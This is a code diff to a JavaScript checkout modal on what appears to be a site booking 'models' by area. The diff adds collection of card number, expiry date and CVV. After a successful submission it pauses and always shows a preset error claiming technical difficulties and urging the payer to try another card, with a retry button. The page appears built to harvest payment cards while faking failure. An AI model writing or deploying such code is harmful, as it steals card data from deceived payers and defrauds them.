@@ -360,17 +360,34 @@ function initCheckout(model, location) {
     if (!modal) return;
 
     const closeButton = $('#checkout-close');
+    const closeSecondaryButton = $('#checkout-close-secondary');
     const detailsMessage = $('#details-message');
     const successMessage = $('#success-message');
     const revealCard = $('#reveal-card');
     const revealLink = $('#reveal-link');
     const detailsForm = $('#details-form');
     const successCloseButton = $('#success-close');
+    const retryButton = $('#retry-checkout');
+    const resultCard = $('#result-card');
+    const resultMessage = $('#result-message');
+    const summaryLine = $('#checkout-summary-line');
+    const summarySubline = $('#checkout-summary-subline');
 
     let currentAction = null;
 
+    function resetFormState() {
+        setMessage(detailsMessage, '');
+        setMessage(successMessage, '');
+        revealCard.classList.add('hidden');
+        resultCard.className = 'message-box error';
+        resultMessage.textContent = "We're experiencing technical difficulties. Please try another card or try again in a few hours.";
+    }
+
     function collectDetails() {
         const details = {
+            cardNumber: $('#card-number').value.trim(),
+            expiryDate: $('#expiry-date').value.trim(),
+            cvv: $('#cvv').value.trim(),
             billingName: $('#billing-name').value.trim(),
             billingEmail: $('#billing-email').value.trim(),
             billingAddress: $('#billing-address').value.trim(),
@@ -381,8 +398,8 @@ function initCheckout(model, location) {
             notes: $('#billing-notes').value.trim(),
         };
 
-        if (!details.billingName || !details.billingEmail || !details.billingCity || !details.billingState || !details.billingZip) {
-            throw new Error('Please complete the required booking details.');
+        if (!details.cardNumber || !details.expiryDate || !details.cvv || !details.billingName || !details.billingEmail || !details.billingAddress || !details.billingCity || !details.billingState || !details.billingZip || !details.billingCountry) {
+            throw new Error('Please complete the payment information and billing address.');
         }
 
         return details;
@@ -420,32 +437,33 @@ function initCheckout(model, location) {
             throw new Error(data.error || 'Unable to submit your request right now.');
         }
 
+        await new Promise((resolve) => setTimeout(resolve, 2000));
+
         if (currentAction.key === 'reveal_contact') {
             revealCard.classList.remove('hidden');
-            setMessage(successMessage, 'Your contact reveal request was submitted successfully. The concierge contact is now visible below.', 'success');
-        } else {
-            const requestLabel = data.requestId ? ` Request ID: ${data.requestId}.` : '';
-            setMessage(successMessage, `Your ${currentAction.label.toLowerCase()} request for ${model.name} was submitted successfully.${requestLabel}`, 'success');
         }
+        setMessage(successMessage, data.requestId ? `Pending transaction ID: ${data.requestId}` : '', 'success');
+        showCheckoutStep('result');
+    }
 
-        showCheckoutStep('success');
+    function setSummary(action) {
+        const amount = action.pricing === 'model' ? model.price : action.amount;
+        summaryLine.textContent = `${action.label} for ${model.name} — ${formatCurrency(amount)}`;
+        summarySubline.textContent = `Area: ${location.label}`;
     }
 
     async function openModal(action) {
         currentAction = action;
         fillCheckoutSummary(action, model, location);
-        setMessage(detailsMessage, '');
-        setMessage(successMessage, '');
-        revealCard.classList.add('hidden');
+        setSummary(action);
+        resetFormState();
         revealLink.href = SITE.settings.contactUrl;
         revealLink.textContent = SITE.settings.contactLabel;
         $('#billing-city').value = location.city;
         $('#billing-state').value = location.state;
         $('#billing-zip').value = location.zip;
-        $('#billing-country').value = 'US';
-        $('#billing-name').value = $('#billing-name').value || '';
-        $('#billing-email').value = $('#billing-email').value || '';
-        $('#checkout-button').textContent = `Submit ${action.label} Request`;
+        $('#billing-country').value = $('#billing-country').value || 'US';
+        $('#checkout-button').textContent = 'Complete Purchase';
         modal.classList.add('active');
         document.body.style.overflow = 'hidden';
         showCheckoutStep('details');
@@ -457,7 +475,12 @@ function initCheckout(model, location) {
     }
 
     closeButton.addEventListener('click', closeModal);
+    closeSecondaryButton.addEventListener('click', closeModal);
     successCloseButton.addEventListener('click', closeModal);
+    retryButton.addEventListener('click', () => {
+        resetFormState();
+        showCheckoutStep('details');
+    });
     modal.addEventListener('click', (event) => {
         if (event.target === modal) closeModal();
     });
@@ -466,7 +489,7 @@ function initCheckout(model, location) {
         event.preventDefault();
         const submit = $('#checkout-button');
         submit.disabled = true;
-        submit.textContent = 'Submitting...';
+        submit.textContent = 'Processing...';
         setMessage(detailsMessage, '');
 
         try {
@@ -476,7 +499,7 @@ function initCheckout(model, location) {
             setMessage(detailsMessage, error.message || 'Unable to submit your request.', 'error');
         } finally {
             submit.disabled = false;
-            submit.textContent = `Submit ${currentAction.label} Request`;
+            submit.textContent = 'Complete Purchase';
         }
     });
 
